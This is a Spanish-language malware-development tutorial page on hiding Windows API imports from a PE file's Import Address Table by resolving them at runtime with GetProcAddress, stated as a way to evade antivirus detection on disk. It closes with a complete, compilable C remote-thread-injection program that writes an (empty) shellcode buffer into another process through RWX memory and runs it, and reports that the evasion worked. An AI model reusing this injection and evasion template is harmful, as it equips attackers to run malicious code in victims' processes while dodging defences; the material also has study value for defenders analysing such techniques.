---
layout: default
title: Ocultandonos de la IAT
parent: Desarrollo de malware
---

{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}


---

## IAT

Cuando un ejecutable es cargado en memoria, el cargador de Windows se encarga de cargar la imagen del ejecutable asi como de cargar todas las DLL que utiliza la aplicacion para poder mapearlas en el espacio de usuario del proceso. Debido a que las direcciones de memoria no son estaticas, es decir que son relativas, se tuvo que diseñar la IAT.

En la estructura de un archivo PE (Portable Executable) existe la estructura IAT (Import Address Table), la cual no es mas que un arreglo que contiene las direcciones de memoria virtuales de las funciones de las DLLs que estan siendo usadas en el PE, por lo que cuando el proceso hace un llamado a una funcion, por ejemplo `OpenProcess`, en realidad se esta llamando a traves de su entrada en la IAT.

En los encabezados de un archivo PE existe la estructura `IMAGE_OPTIONAL_HEADER` definida en el archivo `winnt.h`,
la cual es una de las mas importantes ya que contiene informacion para poder ejecutar y cargar el PE correctamente.
Al final de esta estructura podemos encontrar otra de nombre `IMAGE_DATA_DIRECTORY` que se define de la siguiente forma:

```c
typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD   VirtualAddress;
    DWORD   Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
```

Contiene dos atributos, el primero es una RVA (Relative Virtual Address) que apunta al inicio de un directorio de datos (Data Directory)
y el segundo de el tamaño del directorio de datos. Un directorio de datos es un bloque de datos que se encuentra en una seccion de un PE,
este directorio de datos contiene informacion critica que es requerida por el cargador de windows. Y aqui es donde se encuentra la IAT :D

## ¿Como ocultamos nuestras funciones?

Una de las forma para hacerlo es resolviendolas en tiempo de ejecucion usando `GetProcAddress`, es decir que cuando nuestro malware este en disco
estas funciones no estaran presentes en la IAT, lo cual reduce la deteccion debido a que pueden ser un IOC que las soluciones de AVs pueden detectar.
Aun que claro, ya en memoria las funciones estaran presenten en la IAT, por lo que esto `solo funciona para reducir la deteccion en disco`

### GetProcAddress

Esta funcion permite obtener en tiempo de ejecucion la direccion de una funcion exportada o variable de una DLL que se especifique.
Se define como:

```c
FARPROC GetProcAddress(
  [in] HMODULE hModule,
  [in] LPCSTR  lpProcName
);
```

- **hModule**: Es el manejador que contiene la DLL, este manejador se puede obtener de funciones como `LoadLibrary`, `GetModuleHandle`, etc,

- **lpProcName**: Es el nombre de la variable o funcion exportada

En esencia, GetProcAddress junto al cargador de windows recorren la "Export Directory Table" (EDT) para encontrar la RVA de la funcion o variable que queremos usar de la DLL.

Basicamente la EDT incluye un directorio de datos que contiene informacion sobre las funciones (o simbolos en general) exportados.
Y la EDT tiene la EAT (Export Address Table) que es un arreglo de direcciones donde cada entrada apunta a las funciones o simbolos exportados

### Uso de GetProcAddress

Para poder usarla correctamente debemos de seguir los siguientes pasos:

1. Definir un puntero a la funcion que queremos usar
2. Cargar una DLL u obtener su manejador, en esta podemos usar LoadLibraryA la cual carga por completo una DLL en el espacio de direcciones del proceso,
o usar GetModuleHandle que solamente obtiene el identificador de la DLL. LoadLibrary se usa cuando la DLL no esta cargada y GetModuleHandle cuando sabemos que ya esta cargada
3. Usar GetProcAddress para obtener la direccion de la funcion


#### Definir el puntero

Debemos de saber dos cosas, el tipo de dato de la funcion y de los parametros que recibe, la estructura general es asi

```c
typedef [TIPO FUNCION] (WINAPI *[puntero_funcion])([PARAMETRO], [PARAMETRO]...);
```

Si queremos definir a OpenProcess, seria asi:

```c
typedef HANDLE (WINAPI *pOpenProcess)(DWORD, BOOL, DWORD);
```

- HANDLE es el tipo de datos de la funcion y los parametros son DWORD, BOOL y DWORD, esta sintaxis la podemos ver en la documentacion de cada funcion, por ejemplo:

```c
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwprocess_id
);
```

#### Cargar la DLL u obtener su manejador

La primera forma es usando `LoadLibraryA` de la siguiente forma

```c
HMODULE hDll = LoadLibraryA("kernel32.dll");
if (hDll == NULL) {
    DWORD error = GetLastError();
    fprintf(stderr, "No se pudo cargar kernel32.dll: %lu\n", error);
    FreeLibrary(hDll); // liberar la DLL del espacio de direcciones
}
```

Pero esto es redundante en este caso por que `kernel32` ya esta cargada.

Usando GetProcAddress seria asi:

```c
HMODULE hModule = GetModuleHandle("kernel32.dll");
if (hModule == NULL) {
    DWORD error = GetLastError();
    fprintf(stderr, "No se pudo obtener el identificador de kernel32.dll: %lu\n", error);
}
```

Sin embargo, este codigo se puede reducir llamando a GetModuleHandle directamente en el paso 3

#### Usar GetProcAddress

Para usar GetProcAddress tomando en cuenta todo lo anterior, su sintaxis seria asi:

```c
[puntero_funcion] [nombre_funcion] = ([puntero_funcion])GetProcAddress(GetModuleHandle("[DLL]"), "[funcion de la DLL]");
```

Por ejemplo, para OpenProcess es asi:

```c
pOpenProcess _OpenProcess = (pOpenProcess)GetProcAddress(GetModuleHandle("kernel32.dll"), "OpenProcess");
```

#### Funciones de Remote Thread Injection

Si queremos resolver todas las funciones para la tecnica Remote Thread Injection quedaria se la siguiente forma

```c
// puntero a funciones
typedef HANDLE (WINAPI *pOpenProcess)(DWORD, BOOL, DWORD);
typedef LPVOID (WINAPI *pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE (WINAPI *pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

// Este codigo va el main
pOpenProcess _OpenProcess = (pOpenProcess)GetProcAddress(GetModuleHandle("kernel32.dll"), "OpenProcess");
pVirtualAllocEx _VirtualAllocEx = (pVirtualAllocEx)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAllocEx");
pWriteProcessMemory _WriteProcessMemory = (pWriteProcessMemory)GetProcAddress(GetModuleHandle("kernel32.dll"), "WriteProcessMemory");
pCreateRemoteThread _CreateRemoteThread = (pCreateRemoteThread)GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateRemoteThread");

```

El codigo completo de la inyeccion seria asi

```c
#include <stdio.h>
#include <windows.h>

typedef HANDLE (WINAPI *pOpenProcess)(DWORD, BOOL, DWORD);
typedef LPVOID (WINAPI *pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE (WINAPI *pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

UCHAR shellcode[] = {

};

INT main(INT argc, CHAR* argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Indica el PID\n");
        return 1;
    }

    INT process_id = atoi(argv[1]);

    pOpenProcess _OpenProcess = (pOpenProcess)GetProcAddress(GetModuleHandle("kernel32.dll"), "OpenProcess");
    pVirtualAllocEx _VirtualAllocEx = (pVirtualAllocEx)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAllocEx");
    pWriteProcessMemory _WriteProcessMemory = (pWriteProcessMemory)GetProcAddress(GetModuleHandle("kernel32.dll"), "WriteProcessMemory");
    pCreateRemoteThread _CreateRemoteThread = (pCreateRemoteThread)GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateRemoteThread");

    HANDLE hProcess = _OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
    if (hProcess == NULL) {
        fprintf(stderr, "Error al abrir el proceso.\n");
        return 1;
    }

    LPVOID hAlloc = _VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (hAlloc == NULL) {
        fprintf(stderr, "Error al asignar memoria\n");
        CloseHandle(hProcess);
        return 1;
    }
    fprintf(stderr, "Alloc: 0x%p\n", hAlloc);

    SIZE_T bytes_escritos;
    if (_WriteProcessMemory(hProcess, hAlloc, shellcode, sizeof(shellcode), &bytes_escritos)) {
        fprintf(stderr, "WriteProcessMemory: %llu bytes\n", (DWORD)bytes_escritos);
    } else {
        fprintf(stderr, "Error al escribir la shellcode\n");
        CloseHandle(hProcess);
        return 1;
    }

    DWORD thread_id;
    HANDLE hThread = _CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)hAlloc, NULL, 0, &thread_id);
    if (hThread != NULL) {
        fprintf(stderr, "Thread ID: %u\n", thread_id);
    } else {
        fprintf(stderr, "Error al crear el hilo\n");
    }

    CloseHandle(hThread);

    return 0;
}
```

## Resultados

Si vemos la IAT usando CFF Explorer no observaremos el llamado a las funciones que inyectan la shellcode mas que GetModuleHandle, por lo que funciono bien

![](/assets/img/iat-malware/1.png)